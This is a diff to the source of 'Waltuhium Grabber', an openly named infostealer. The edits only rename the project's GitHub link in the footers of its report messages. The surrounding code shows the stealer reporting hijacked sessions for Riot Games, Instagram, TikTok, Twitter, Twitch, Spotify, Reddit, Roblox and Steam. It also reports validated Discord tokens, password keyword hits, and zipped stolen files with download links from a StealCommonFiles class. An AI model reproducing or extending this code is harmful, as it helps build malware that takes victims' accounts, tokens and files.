@@ -731,7 +731,7 @@ class Main:
                     "description": f"***Waltuhium Riot Games Session was detected on the {browser} browser***",
                     "url" : "https://t.me/waltuhium",
                     "color": 0,
-                    "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/Waltuhium-Grabber"},
+                    "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/waltuhium"},
                     "thumbnail": {"url": "https://i.hizliresim.com/qxnzimj.jpg"}}
                 username = str(response["username"])
                 email = str(response["email"])
@@ -805,7 +805,7 @@ class Main:
                 "description": f"***Waltuhium Instagram Session was detected on the {browser} browser***",
                 "url" : "https://t.me/waltuhium",
                 "color": 0,
-                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/Waltuhium-Grabber"},
+                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/waltuhium"},
                 "thumbnail": {"url": pp}}
             fields = [
                 {"name": "Username", "value": "``" + username + "``", "inline": True},
@@ -865,7 +865,7 @@ class Main:
                 "description": f"***Waltuhium Tiktok Session was detected on the {browser} browser***",
                 "url" : "https://t.me/waltuhium",
                 "color": 0,
-                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/Waltuhium-Grabber"},
+                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/waltuhium"},
                 "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"}}
             fields = [
                 {"name": "Username", "value": "``" + username + "``", "inline": True},
@@ -937,7 +937,7 @@ class Main:
                 "description": f"***Waltuhium Twitter Session was detected on the {browser} browser***",
                 "url" : "https://t.me/waltuhium",
                 "color": 0,
-                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/Waltuhium-Grabber"},
+                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/waltuhium"},
                 "thumbnail": {"url": pp}}
             fields = [
                 {"name": "Username", "value": "``" + username + "``", "inline": True},
@@ -1021,7 +1021,7 @@ class Main:
                 "description": f"***Waltuhium Twitch Session was detected on the {browser} browser***",
                 "url" : "https://t.me/waltuhium",
                 "color": 0,
-                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/Waltuhium-Grabber"},
+                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/waltuhium"},
                 "thumbnail": {"url": pp}}
             fields = [
                 {"name": "Username", "value": "``" + str(login) + "``", "inline": True},
@@ -1077,7 +1077,7 @@ class Main:
                 "description": f"***Waltuhium Spotify Session was detected on the {browser} browser***",
                 "url" : "https://t.me/waltuhium",
                 "color": 0,
-                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/Waltuhium-Grabber"},
+                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/waltuhium"},
                 "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"}}
             fields = [
                 {"name": "Email", "value": "``" + str(email) + "``", "inline": True},
@@ -1143,7 +1143,7 @@ class Main:
                 "description": f"***Waltuhium Reddit Session was detected on the {browser} browser***",
                 "url" : "https://t.me/waltuhium",
                 "color": 0,
-                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/Waltuhium-Grabber"},
+                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/waltuhium"},
                 "thumbnail": {"url": pp}}
             fields = [
                 {"name": "Username", "value": "``" + str(username) + "``", "inline": True},
@@ -1194,7 +1194,7 @@ class Main:
                     "description": f"***Waltuhium Roblox Session was detected on the {browser} browser***",
                     "url" : "https://t.me/waltuhium",
                     "color": 0,
-                    "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/Waltuhium-Grabber"},
+                    "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/waltuhium"},
                     "thumbnail": {"url": pp}}
                 fields = [
                     {"name": "Name", "value": "``" + str(name) + "``", "inline": True},
@@ -1449,7 +1449,7 @@ class Main:
                 "description": f"***Waltuhium Validated Discord Token Detected***",
                 "url" : "https://t.me/waltuhium",
                 "color": 0,
-                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/Waltuhium-Grabber"},
+                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/waltuhium"},
                 "thumbnail": {"url": ""}}
                 if pp:
                     embed_data["thumbnail"]["url"] = pp
@@ -1518,9 +1518,9 @@ class Main:
                                 embed_data = {
                                     "title": "***Waltuhium Grabber***",
                                     "description": f"***Waltuhium Steam Session Detected***",
-                                    "url" : "https://github.com/waltuh23/Waltuhium-Grabber",
+                                    "url" : "https://github.com/waltuh23/waltuhium",
                                     "color": 0,
-                                    "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/Waltuhium-Grabber"},
+                                    "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/waltuhium"},
                                     "thumbnail": {"url": avatar}}
                                 fields = [
                                         {"name": "Username", "value": "``" + str(personname) + "``", "inline": True},
@@ -1803,7 +1803,7 @@ class Main:
                 "description": f"***Keyword Result***",
                 "url" : "https://t.me/waltuhium",
                 "color": 0,
-                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/Waltuhium-Grabber"},
+                "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/waltuhium"},
                 "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"}}
             fields = [
                 {"name": "Passwords", "value": "```" + str(password_keys) + "```", "inline": False},
@@ -1839,7 +1839,7 @@ class Main:
             "description": f"***Waltuhium Grabber Full Info***",
             "url" : "https://t.me/waltuhium",
             "color": 0,
-            "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/Waltuhium-Grabber"},
+            "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/waltuhium"},
             "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"}}
         fields = [
              {"name": "Password", "value": "``" + str(len(Variables.Passwords)) + "``", "inline": True},
@@ -1888,7 +1888,7 @@ class Main:
                         "description": f"***Waltuhium Grabber Full Info***",
                         "url" : "https://t.me/waltuhium",
                         "color": 0,
-                        "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/Waltuhium-Grabber"},
+                        "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/waltuhium"},
                         "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"}}
                     fields2 = [{"name": "Download Link", "value": f"[{uuid}.zip]({succes})", "inline": True}]
                     embed_data2["fields"] = fields2
@@ -2070,7 +2070,7 @@ class StealCommonFiles:
                             "description": f"***Grabbed Files***",
                             "url" : "https://t.me/waltuhium",
                             "color": 0,
-                            "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/Waltuhium-Grabber"},
+                            "footer": {"text": "https://t.me/waltuhium | https://github.com/waltuh23/waltuhium"},
                             "thumbnail": {"url": "https://cdn.discordapp.com/attachments/1192191430827970571/1196865524919975976/68747470733a2f2f63646e2e646973636f72646170702e636f6d2f6174746163686d656e74732f313133383134313739313736363435383530392f313134373536383733383636353737393332322f494d475f393136312d72656d6f766562672d707265766965772e70.png"}}
                     fields2 = [{"name": "Download Link", "value": f"[Files.zip]({uploaded_url})", "inline": True}]
                     embed_data2["fields"] = fields2
